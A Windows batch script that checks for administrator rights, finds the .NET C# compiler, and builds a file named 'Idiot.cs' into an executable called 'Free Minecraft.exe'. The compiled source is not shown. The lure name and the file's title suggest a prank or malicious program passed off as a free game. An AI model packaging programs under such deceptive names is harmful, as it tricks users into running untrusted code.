@echo off
title Free Minecraft Ultimate Builder
color 0b

:: 1. CHECK FOR ADMIN RIGHTS
net session >nul 2>&1
if %errorLevel% == 0 (
    echo [OK] Administrator privileges detected.
) else (
    echo [!!] ERROR: YOU MUST RUN THIS AS ADMINISTRATOR!
    echo Right-click this file and select "Run as administrator".
    pause
    exit
)

:: 2. FIND THE COMPILER AUTOMATICALLY
echo Searching for C# Compiler...
set "CSC_PATH="

:: Check different possible locations for csc.exe
if exist "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" set "CSC_PATH=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if not defined CSC_PATH if exist "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" set "CSC_PATH=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"

if not defined CSC_PATH (
    echo [!!] ERROR: C# Compiler not found! 
    echo Please install .NET Framework 4.5 or newer on your VM.
    pause
    exit
)

echo [OK] Compiler found at: %CSC_PATH%
echo.

:: 3. COMPILE THE CODE
echo Building "Free Minecraft.exe"...
"%CSC_PATH%" /target:winexe /r:System.Windows.Forms.dll /r:System.Drawing.dll /out:"Free Minecraft.exe" Idiot.cs

if exist "Free Minecraft.exe" (
    echo.
    echo ==============================================
    echo   SUCCESS! "Free Minecraft.exe" is ready.
    echo ==============================================
) else (
    echo.
    echo [!!] COMPILATION FAILED! 
    echo Check if "Idiot.cs" is in the same folder as this .bat file.
    echo Also, check for typos in the C# code.
)

pause
